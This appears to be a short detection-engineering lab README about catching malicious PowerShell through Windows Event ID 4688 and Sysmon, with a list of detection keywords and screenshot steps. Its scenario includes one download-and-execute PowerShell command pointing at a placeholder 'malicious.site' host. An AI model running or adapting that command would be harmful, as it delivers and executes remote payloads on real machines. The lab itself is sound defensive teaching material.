# Detection Engineering Lab

This lab demonstrates how to detect suspicious PowerShell activity using Windows Event Logs and Sysmon.

## Lab Scenario

An attacker executes a PowerShell command that downloads and executes a malicious payload.

Example:

powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"

## Detection Sources

- Windows Security Log (Event ID 4688)
- Sysmon Event ID 1 (Process Creation)

## Detection Logic

Alert when PowerShell runs with suspicious parameters:

- -nop
- -enc
- downloadstring
- IEX

## MITRE ATT&CK

Technique: T1059.001  
PowerShell

## Tools Used

- Windows 11
- Sysmon
- Event Viewer

  ## Detection Rule

This attack can be detected by monitoring Windows Event ID 4688 and looking for PowerShell execution with the following indicators:

- EncodedCommand
- NoProfile
- Hidden window style

### Step 1 – Encode PowerShell Command
![Step1](usecase-powershell-detection/screenshots1.jpg)

### Step 2 – Execute Encoded Command
![Step2](usecase-powershell-detection/screenshots2.jpg)

### Step 3 – PowerShell Execution
![Step3](usecase-powershell-detection / screenshots3.jpg)

### Step 4 –PowerShell Execution
![Step4](usecase-powershell-detection/screenshots4.jpg)

### Step 5 – Event 4688 Generated
![Step5](usecase-powershell-detection/screenshots5.jpg)

### Step 6 – Command Line Details
![Step6](usecase-powershell-detection/screenshots6.jpg)
